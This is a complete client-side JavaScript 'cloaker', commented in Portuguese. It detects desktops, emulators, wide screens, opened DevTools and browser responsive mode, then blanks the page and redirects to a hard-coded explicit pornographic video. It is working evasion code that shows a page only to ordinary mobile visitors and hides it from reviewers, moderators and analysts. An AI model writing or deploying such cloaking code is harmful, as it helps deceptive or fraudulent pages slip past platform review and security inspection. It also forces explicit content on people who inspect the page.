/**
 * CLOAKER CLIENT-SIDE - VERSÃO 2.0
 * Proteção contra desktop, emuladores, DevTools e visualização responsiva
 * Autor: Sistema de Proteção Avançada
 * Data: 2025
 */

(function() {
    'use strict';
    
    // Configuração do redirecionamento
    const REDIRECT_URL = 'https://www.xvideos.com/video.umtvkhb9ecc/meio-irmao_gostosa_e_fodida_pelo_meio-irmao';
    
    // Variáveis de controle
    let protectionActive = true;
    let lastDebugTime = Date.now();
    
    /**
     * Função principal de proteção
     */
    function initProtection() {
        if (!protectionActive) return;
        
        // Executar verificações imediatas
        checkDesktop();
        checkEmulators();
        checkDevTools();
        checkResponsiveView();
        
        // Verificação contínua
        setInterval(() => {
            if (!protectionActive) return;
            checkDevTools();
            checkResponsiveView();
        }, 1000);
    }
    
    /**
     * 🔒 1. Bloquear computadores e notebooks (desktop)
     */
    function checkDesktop() {
        const userAgent = navigator.userAgent.toLowerCase();
        const mobilePatterns = [
            'android', 'iphone', 'ipad', 'ipod', 'blackberry', 'iemobile', 
            'opera mini', 'mobile', 'tablet', 'phone', 'samsung', 'xiaomi',
            'motorola', 'lg', 'nokia', 'huawei', 'oneplus', 'google pixel'
        ];
        
        const isMobile = mobilePatterns.some(pattern => userAgent.includes(pattern));
        
        if (!isMobile) {
            console.log('[PROTECTION] Desktop detectado - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * 🧪 2. Bloquear emuladores e dispositivos com tela ampla
     */
    function checkEmulators() {
        // Verificar suporte a toque
        const hasTouchSupport = 'ontouchstart' in window;
        
        // Verificar largura da tela
        const isWideScreen = screen.width > 1024;
        
        if (!hasTouchSupport || isWideScreen) {
            console.log('[PROTECTION] Emulador ou tela ampla detectado - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * 🛡️ 3. Detectar abertura do DevTools (inspecionar elemento)
     */
    function checkDevTools() {
        const currentTime = Date.now();
        const timeDiff = currentTime - lastDebugTime;
        
        // Se o tempo entre execuções for maior que 100ms, DevTools foi aberto
        if (timeDiff > 100) {
            console.log('[PROTECTION] DevTools detectado - redirecionando...');
            redirectToTarget();
        }
        
        lastDebugTime = currentTime;
        
        // Debugger oculto
        try {
            debugger;
        } catch (e) {
            // Ignorar erros do debugger
        }
    }
    
    /**
     * 📏 4. Detectar visualização responsiva (modo emulador)
     */
    function checkResponsiveView() {
        const widthDiff = window.outerWidth - window.innerWidth;
        const heightDiff = window.outerHeight - window.innerHeight;
        const threshold = 160;
        
        if (widthDiff > threshold || heightDiff > threshold) {
            console.log('[PROTECTION] Visualização responsiva detectada - redirecionando...');
            redirectToTarget();
        }
    }
    
    /**
     * Função de redirecionamento
     */
    function redirectToTarget() {
        protectionActive = false;
        
        // Limpar conteúdo da página
        document.documentElement.innerHTML = '';
        
        // Redirecionar
        try {
            window.location.href = REDIRECT_URL;
        } catch (e) {
            // Fallback
            window.location.replace(REDIRECT_URL);
        }
    }
    
    // Inicializar proteção quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initProtection);
    } else {
        initProtection();
    }
    
    // Proteção adicional no load
    window.addEventListener('load', () => {
        // Verificar novamente após carregamento completo
        setTimeout(() => {
            checkDesktop();
            checkEmulators();
        }, 1000);
    });
    
})();
